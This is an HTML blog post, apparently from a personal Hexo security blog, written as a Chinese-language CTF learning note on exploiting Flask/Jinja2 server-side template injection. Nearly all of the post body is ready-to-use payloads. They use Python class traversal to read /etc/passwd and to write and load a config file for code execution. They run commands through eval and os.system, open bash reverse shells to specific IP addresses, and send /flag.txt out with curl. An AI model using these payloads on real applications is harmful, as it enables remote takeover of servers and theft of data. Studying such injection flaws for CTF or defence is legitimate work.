@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="FlaskJinja2SSTI"/>
+
+
+
+
+  <meta name="keywords" content="难度简单的Python," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="RuoWeber">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2019/09/08/FlaskJinja2SSTI/"/>
+
+
+<meta name="description" content="前言500线下因为这题没了。。。">
+<meta name="keywords" content="难度简单的Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FlaskJinja2SSTI">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;08&#x2F;FlaskJinja2SSTI&#x2F;index.html">
+<meta property="og:site_name" content="RuoWeber">
+<meta property="og:description" content="前言500线下因为这题没了。。。">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-11-11T03:45:11.117Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> FlaskJinja2SSTI - RuoWeber </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">RuoWeber</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          FlaskJinja2SSTI
+        
+      </h1>
+
+      <time class="post-time">
+          Sep 08 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>500线下因为这题没了。。。</p>
+<a id="more"></a>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>这里有一点是，如果我的url里包含，那么xxx会被模板引擎执行 ，利用这一点，</p>
+<p>使用<code>&#39;&#39;.__class__.__mro__[2]</code>先获取到object类的属性(python里所有类都继承于它，这样我们便可以找到我们想要的类了(<code>&#39;&#39;.__class__.__mro__[2].__subclasses__()</code> ))。然后我们找到一个利用点较直接的类:File,此时我们有了第一个任意文件读取和写入的exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line">- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;,  &apos;w&apos;).write(&apos;&lt;malicious code here&gt;&apos;)</span><br><span class="line"></span><br><span class="line">接下来就是利用Flask(Jinja2)的特性进行rce了(8太懂，直接po出exp)</span><br><span class="line">1.&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;)</span><br><span class="line"></span><br><span class="line">2.config.from_pyfile(&apos;/tmp/owned.cfg&apos;)</span><br><span class="line"></span><br><span class="line">3.config[&apos;RUNCMD&apos;](&apos;/usr/bin/id&apos;,shell=True)</span><br></pre></td></tr></table></figure>
+
+<p>这里[40]是file类，这是任意文件读取可以用的，但是如果read被ban可能就难受了。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>1.命令执行的第一种是利用<code>eval</code>，怎样去“到达”eval:<code>利用warnings.catch_warnings类的globals属性去找built-in function</code></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&apos;os&apos;).system(&apos;cmd&apos;)&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;cmd&apos;).read()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/139.159.140.198/2345 0&gt;&amp;1&quot;&apos;)(这个类是site.Quitter，还没分析)</span><br></pre></td></tr></table></figure>
+
+<p>这里其实popen也有read，而且命令无回显也会很难受。</p>
+<h3 id="shell和带外"><a href="#shell和带外" class="headerlink" title="shell和带外?"></a>shell和带外?</h3><p>如果命令无回显，我们肯定可以做的就是反弹shell,但是如果我们能拿到shell，所有问题都可以解决:</p>
+<p>弹shell再这我们讨论的情况肯定就是bash或者python，bash好说，只要我们bash弹shell的exp用命令执行的payload执行就可以了(发现是bash弹shell的命令的问题。。改好可以成功执行了)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;bash -c \&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 0&gt;&amp;1\&apos;&quot;).read()&apos;)</span><br><span class="line">2.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;bash -c \&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 0&gt;&amp;1\&apos;&quot;)&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>或者可以进行带外把数据带出来:</p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;curl http://192.168.76.195:7777？a=</code>cat /flag.txt``”)’)`</p>
+<h3 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h3><p>反弹bash shell在python ssti中虽然可以借助命令执行很方便，</p>
+<p>但是可以尝试先写入文件，在执行文件去反弹 python shell:</p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;execfile&#39;](&#39;/home/alss/Desktop/testsys.py&#39;)</code></p>
+<p>或者其他执行文件的方法</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/">难度简单的Python</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/09/09/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%BE%E4%BE%8B%E5%AD%A6%E4%B9%A0/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">无参数rce举例学习</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/09/08/Django%E4%BD%8E%E7%89%88%E6%9C%ACRce/">
+        <span class="next-text nav-default">Django低版本Rce</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2020
+    <span class="footer-author">asy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
